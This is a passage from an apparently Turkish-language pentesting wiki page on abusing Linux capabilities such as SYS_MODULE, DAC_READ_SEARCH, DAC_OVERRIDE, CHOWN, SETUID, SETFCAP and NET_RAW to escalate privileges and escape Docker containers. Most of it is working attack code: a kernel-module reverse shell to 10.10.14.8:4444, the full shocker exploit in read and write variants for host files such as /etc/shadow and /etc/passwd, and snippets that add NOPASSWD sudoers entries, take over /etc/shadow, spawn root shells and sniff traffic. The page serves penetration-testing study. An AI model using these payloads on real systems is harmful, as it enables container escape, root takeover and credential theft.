km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**Binary ile 2. örnek**

Aşağıdaki örnekte **`kmod`** binary'si bu capability'ye sahiptir.
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
Bu, bir kernel module eklemek için **`insmod`** komutunun kullanılabileceği anlamına gelir. Bu yetkiyi kötüye kullanarak **reverse shell** elde etmek için aşağıdaki örneği inceleyin.

**Environment ile örnek (Docker breakout)**

Docker container içindeki etkin capabilities değerlerini şu komutu kullanarak kontrol edebilirsiniz:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Önceki çıktıda **SYS_MODULE** capability'sinin etkin olduğunu görebilirsiniz.

Bir reverse shell çalıştıracak **kernel module**'ü ve bunu **compile** etmek için **Makefile**'ı **oluşturun**:
```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
> [!WARNING]
> Makefile'daki her `make` komutundan önceki boş karakter **boşluk değil, tab olmalıdır**!

Derlemek için `make` komutunu çalıştırın.
```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
Son olarak, bir shell içinde `nc`'yi başlatın ve **modülü** başka bir shell'den **yükleyin**; böylece nc process'i içindeki shell'i ele geçireceksiniz:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**Bu tekniğin kodu,** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **adresindeki "Abusing SYS_MODULE Capability" laboratuvarından kopyalanmıştır.**

Bu tekniğin başka bir örneğine [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host) adresinden ulaşılabilir.

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html), bir process'in **dosyaları okuma ve dizinleri okuma ve çalıştırma izinlerini bypass etmesini** sağlar. Temel kullanım amacı dosya arama veya okuma işlemleridir. Ancak bu capability, bir process'in process'in mount namespace'i dışındaki dosyalar da dahil olmak üzere herhangi bir dosyaya erişebilen `open_by_handle_at(2)` fonksiyonunu kullanmasına da olanak tanır. `open_by_handle_at(2)` içinde kullanılan handle'ın, `name_to_handle_at(2)` aracılığıyla elde edilen transparan olmayan bir identifier olması beklenir; ancak bu handle, manipülasyona açık inode numaraları gibi hassas bilgiler içerebilir. Özellikle Docker container'ları bağlamında bu capability'nin exploit edilme potansiyeli, Sebastian Krahmer tarafından shocker exploit'i ile gösterilmiş ve [burada](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) analiz edilmiştir.
**Bu, dosya okuma permission kontrollerini ve dizin okuma/çalıştırma permission kontrollerini bypass edebileceğiniz anlamına gelir.**

**Binary ile örnek**

Binary herhangi bir dosyayı okuyabilecektir. Bu nedenle tar gibi bir dosyada bu capability varsa shadow file'ı okuyabilecektir:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**binary2 ile örnek**

Bu durumda **`python`** binary'sinin bu capability'ye sahip olduğunu varsayalım. Root dosyalarını listelemek için şunu çalıştırabilirsiniz:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
Ve bir dosyayı okumak için şunu yapabilirsiniz:
```python
print(open("/etc/shadow", "r").read())
```
**Example in Environment (Docker breakout)**

Docker container içinde etkinleştirilmiş capabilities değerlerini şu komutu kullanarak kontrol edebilirsiniz:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Önceki çıktıda **DAC_READ_SEARCH** capability'sinin etkin olduğunu görebilirsiniz. Bunun sonucunda container **debug processes** işlemlerini gerçekleştirebilir.

Aşağıdaki exploit'in nasıl çalıştığını [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) adresinden öğrenebilirsiniz; ancak özetle, **CAP_DAC_READ_SEARCH** yalnızca dosya sisteminde permission checks olmadan gezinmemize izin vermekle kalmaz, aynı zamanda _**open_by_handle_at(2)**_ için yapılan tüm kontrolleri açıkça kaldırır ve **process'imizin diğer process'ler tarafından açılmış sensitive files dosyalarına erişmesine olanak sağlayabilir**.

Host'tan files okumak için bu permission'ı kötüye kullanan original exploit'e buradan ulaşabilirsiniz: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c); aşağıdaki sürüm, okumak istediğiniz file'ı first argument olarak belirtmenize ve çıktıyı bir file'a dump etmenize olanak sağlayan **modified version'dır.**
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
> [!WARNING]
> Exploit, host üzerinde mount edilmiş bir şeye işaretçi bulmalıdır. Orijinal exploit `/.dockerinit` dosyasını kullanıyordu; bu değiştirilmiş sürüm ise `/etc/hostname` kullanıyor. Exploit çalışmıyorsa farklı bir dosya ayarlamanız gerekebilir. Host üzerinde mount edilmiş bir dosya bulmak için `mount` komutunu çalıştırmanız yeterlidir:

![CAP SYS MODULE - CAP DAC READ SEARCH: Exploit, host üzerinde mount edilmiş bir şeye işaretçi bulmalıdır. Orijinal exploit /.dockerinit dosyasını kullanıyordu; bu değiştirilmiş sürüm ise...](<../../images/image (407) (1).png>)

**Bu tekniğin kodu,** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com) **sitesindeki "Abusing DAC_READ_SEARCH Capability" laboratuvarından kopyalanmıştır.**


## CAP_DAC_OVERRIDE

**Bu, herhangi bir dosyadaki yazma izni kontrollerini bypass edebileceğiniz ve böylece herhangi bir dosyaya yazabileceğiniz anlamına gelir.**

**Privilege escalation gerçekleştirmek için overwrite edebileceğiniz** birçok dosya vardır; [**buradan fikir edinebilirsiniz**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Binary ile örnek**

Bu örnekte vim bu capability'ye sahiptir; dolayısıyla _passwd_, _sudoers_ veya _shadow_ gibi herhangi bir dosyayı değiştirebilirsiniz:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**Binary 2 ile örnek**

Bu örnekte **`python`** binary'si bu capability'ye sahip olacaktır. Herhangi bir dosyanın üzerine yazmak için python kullanabilirsiniz:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**Environment + CAP_DAC_READ_SEARCH ile örnek (Docker breakout)**

Docker container içindeki etkin capabilities değerlerini şu komutla kontrol edebilirsiniz:
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Her şeyden önce, hostun **istenen dosyalarını okumak için DAC_READ_SEARCH capability'sini kötüye kullanan** [**önceki bölümü**](linux-capabilities.md#cap_dac_read_search) okuyun ve **exploit'i derleyin**.\
Ardından, hostun dosya sistemi içinde **istenen dosyaları yazmanıza** olanak tanıyacak **shocker exploit'inin aşağıdaki sürümünü derleyin**:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Docker container'dan **escape** olmak için host üzerindeki `/etc/shadow` ve `/etc/passwd` dosyalarını **download** edebilir, bunlara **new user** **add** edebilir ve dosyaların üzerine yazmak için **`shocker_write`** kullanabilirsiniz. Ardından **ssh** üzerinden **access** sağlayabilirsiniz.

**Bu tekniğin kodu,** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com) **sitesindeki "Abusing DAC_OVERRIDE Capability" laboratuvarından kopyalanmıştır.**

## CAP_CHOWN

**Bu, herhangi bir dosyanın ownership bilgisinin değiştirilebileceği anlamına gelir.**

**binary ile örnek**

**`python`** binary'sinin bu capability'ye sahip olduğunu varsayalım; **`shadow`** dosyasının **owner** bilgisini değiştirebilir, **root password**'ü **change** edebilir ve privilege escalation gerçekleştirebilirsiniz:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
Ya da bu capability'ye sahip **`ruby`** binary'siyle:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP_FOWNER

**Bu, herhangi bir dosyanın izinlerini değiştirmenin mümkün olduğu anlamına gelir.**

**binary ile örnek**

Python bu capability'ye sahipse shadow dosyasının izinlerini değiştirebilir, **root parolasını değiştirebilir** ve ayrıcalıkları yükseltebilirsiniz:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP_SETUID

**Bu, oluşturulan process'in effective user id değerinin ayarlanabileceği anlamına gelir.**

**binary ile örnek**

Python bu **capability** değerine sahipse, bunu abuse ederek root'a privilege escalation yapmak çok kolaydır:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**Başka bir yol:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP_SETGID

**Bu, oluşturulan process'in effective group id değerinin ayarlanabileceği anlamına gelir.**

**Yetkileri yükseltmek için üzerine yazabileceğiniz** birçok dosya vardır; [**buradan fikir edinebilirsiniz**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Binary ile örnek**

Bu durumda, herhangi bir grubun kimliğine bürünebildiğiniz için bir grubun okuyabildiği ilginç dosyaları aramalısınız:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
Okuma veya yazma yoluyla privilege escalation için abuse edebileceğiniz bir dosya bulduğunuzda, **ilgi çekici grubu taklit eden bir shell** elde edebilirsiniz:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
Bu durumda shadow grubunun kimliğine bürünüldü; bu nedenle `/etc/shadow` dosyasını okuyabilirsiniz:
```bash
cat /etc/shadow
```
### Combined chain: CAP_SETGID + CAP_CHOWN

Her iki capability de aynı helper'da mevcut olduğunda, pratik bir chain şöyledir:

1. EGID'yi `shadow` (veya başka bir ayrıcalıklı group) olarak değiştirin.
2. Group'u `shadow` olarak korurken UID'nizi ayarlamak için `/etc/shadow` üzerinde `chown` kullanın.
3. Bir target hash okuyup crack/pivot gerçekleştirin.
```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```
Bu, doğrudan tam **root** erişimi gerektirmez ve genellikle credential reuse üzerinden pivot yapmak için yeterlidir.

**docker** kuruluysa, **docker group** kimliğine **impersonate** yapabilir ve bunu [**docker socket** ile iletişim kurup yetkileri yükseltmek](#writable-docker-socket) için abuse edebilirsiniz.

## CAP_SETFCAP

**Bu, dosyalar ve process'ler üzerinde capability ayarlanabileceği anlamına gelir**

**Binary ile örnek**

Python'da bu **capability** varsa, bunu abuse ederek yetkileri çok kolay bir şekilde root seviyesine yükseltebilirsiniz:
```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```
> [!WARNING]
> CAP_SETFCAP ile binary'ye yeni bir capability ayarlarsanız bu capability'yi kaybedeceğinizi unutmayın.

[SETUID capability](linux-capabilities.md#cap_setuid)'ye sahip olduğunuzda, privilege escalation işleminin nasıl yapılacağını görmek için ilgili bölüme gidebilirsiniz.

**Ortam ile örnek (Docker breakout)**

Varsayılan olarak Docker'da container içindeki process'e **CAP_SETFCAP capability'si verilir**. Bunu şu şekilde kontrol edebilirsiniz:
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
Bu capability, **binary'lere başka herhangi bir capability verme** imkanı sağlar; bu nedenle, bu sayfada bahsedilen **diğer capability breakout'larından herhangi birini kötüye kullanarak** container'dan **escape** edebileceğimizi düşünebiliriz.\
Ancak örneğin CAP_SYS_ADMIN ve CAP_SYS_PTRACE capability'lerini gdb binary'sine vermeyi denerseniz, bunları verebildiğinizi, fakat bundan sonra **binary'nin çalıştırılamayacağını** görürsünüz:
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[Dokümanlardan](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: Bu, thread'in kullanabileceği **effective capabilities** için sınırlayıcı bir üst kümedir. Ayrıca, effective set'inde **CAP_SETPCAP** capability'si **bulunmayan** bir thread tarafından inheri‐table set'e eklenebilecek capabilities için de sınırlayıcı bir üst kümedir._\
Görünüşe göre Permitted capabilities, kullanılabilecek capabilities'leri sınırlar.\
Bununla birlikte Docker, varsayılan olarak **CAP_SETPCAP** de verir; bu nedenle **inheritables set içine yeni capabilities ekleyebilmeniz** mümkün olabilir.\
Ancak bu capability'nin dokümantasyonunda şu ifade yer alır: _CAP_SETPCAP : \[…] **calling thread’in bounding** set'inden herhangi bir capability'yi inheritable set'ine ekleyebilir_.\
Görünüşe göre inheritable set'e yalnızca bounding set'te bulunan capabilities'leri ekleyebiliriz. Bu da **privilege escalation** için CAP_SYS_ADMIN veya CAP_SYS_PTRACE gibi yeni capabilities'leri inherit set'e koyamayacağımız anlamına gelir.

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html), `/dev/mem`, `/dev/kmem` veya `/proc/kcore` erişimi, `mmap_min_addr` değerini değiştirme, `ioperm(2)` ve `iopl(2)` system call'larına erişim ve çeşitli disk komutları dahil olmak üzere bir dizi hassas işlem sağlar. [Geçmişte](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html) sorunlara yol açmış olan `FIBMAP ioctl(2)` da bu capability aracılığıyla etkinleştirilir. Man page'e göre bu capability, sahibinin `diğer cihazlarda cihazlara özgü çeşitli işlemleri açıklayıcı bir şekilde gerçekleştirmesine` de olanak tanır.

Bu, **privilege escalation** ve **Docker breakout** için faydalı olabilir.

## CAP_KILL

**Bu, herhangi bir process'i kill etmenin mümkün olduğu anlamına gelir.**

**binary ile örnek**

**`python`** binary'sinin bu capability'ye sahip olduğunu varsayalım. **Bir service veya socket configuration** (ya da bir service ile ilgili herhangi bir configuration file) dosyasını **ayrıca değiştirebilirseniz**, dosyaya backdoor ekleyebilir ve ardından bu service ile ilişkili process'i kill edip yeni configuration file'ın backdoor'unuzla çalıştırılmasını bekleyebilirsiniz.
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**Privesc with kill**

Eğer kill capabilities'e sahipseniz ve **root olarak** (veya farklı bir kullanıcı olarak) çalışan bir **node programı** varsa, muhtemelen ona **SIGUSR1 sinyalini** **gönderebilir** ve node debugger'ını **açmasını** sağlayabilirsiniz; böylece bağlanabilirsiniz.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**Bu, herhangi bir portu (ayrıcalıklı portlar dahil) dinlemenin mümkün olduğu anlamına gelir.** Bu capability ile doğrudan privilege escalation yapamazsınız.

**Binary ile örnek**

**`python`** bu capability'ye sahipse herhangi bir portu dinleyebilir ve hatta bu porttan başka herhangi bir porta bağlantı kurabilir (bazı servisler belirli ayrıcalıklı portlardan gelen bağlantıları gerektirir).

{{#tabs}}
{{#tab name="Listen"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{{#endtab}}

{{#tab name="Connect"}}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) capability, process'lerin **RAW ve PACKET socket'leri oluşturmasına** izin verir ve böylece rastgele network packet'leri üretip göndermelerini sağlar. Bu durum containerized ortamlarda packet spoofing, traffic injection ve network access control'lerini bypass etme gibi security risk'lerine yol açabilir. Kötü niyetli kişiler, özellikle yeterli firewall koruması olmadan, container routing'ine müdahale etmek veya host network security'sini tehlikeye atmak için bundan yararlanabilir. Ayrıca **CAP_NET_RAW**, privileged container'ların RAW ICMP request'leri üzerinden ping gibi işlemleri desteklemesi için kritik öneme sahiptir.

**Bu, traffic sniffing yapılabileceği anlamına gelir.** Bu capability ile doğrudan privilege escalation yapamazsınız.

**Binary ile örnek**

Binary **`tcpdump`** bu capability'ye sahipse network information capture etmek için kullanabilirsiniz.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
Bu **environment** bu capability'yi sağlıyorsa trafiği sniff etmek için **`tcpdump`** da kullanabileceğinizi unutmayın.

**binary 2 ile örnek**

Aşağıdaki örnek, "**lo**" (**localhost**) interface'inin trafiğini intercept etmek için faydalı olabilecek **`python2`** kodudur. Kod, [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com) adresindeki "_The Basics: CAP-NET_BIND + NET_RAW_" lab'inden alınmıştır.
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

